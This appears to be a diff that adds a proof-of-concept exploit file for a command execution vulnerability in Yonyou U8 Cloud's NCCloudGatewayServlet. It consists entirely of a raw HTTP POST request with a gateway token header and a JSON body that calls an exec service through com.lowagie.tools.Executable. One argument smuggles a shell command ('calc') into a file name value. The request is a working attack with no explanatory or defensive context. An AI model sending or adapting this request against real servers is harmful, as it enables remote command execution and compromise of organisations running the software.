@@ -1,0 +1,41 @@
+# 用友 U8 Cloud NCCloudGatewayServlet 命令执行漏洞
+POST /service/NCCloudGatewayServlet HTTP/1.1
+Host: www.xwd_test.com
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+gatewaytoken:TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Cache-Control: max-age=0
+Content-Type: application/json
+Content-Length: 792
+
+{
+  "serviceInfo": {
+    "serviceClassName": "com.ufida.zior.console.IActionInvokeService",
+    "serviceMethodName": "exec",
+    "serviceMethodArgInfo": [
+      {
+        "argType": { "body": "java.lang.String" },
+        "argValue": { "body": "com.lowagie.tools.Executable" },
+        "agg":false,
+        "isArray":false,
+        "isPrimitive":false
+      },
+      {
+        "argType": { "body": "java.lang.String" },
+        "argValue": { "body": "printDocumentSilent" },
+        "agg":false,
+        "isArray":false,
+        "isPrimitive":false
+      },
+      {
+        "argType": { "body": "java.lang.Object" },
+        "argValue": { "body": "aa.txt\"| calc ;\"" },
+        "agg":false,
+        "isArray":false,
+        "isPrimitive":false
+      }
+    ]
+  }
+}
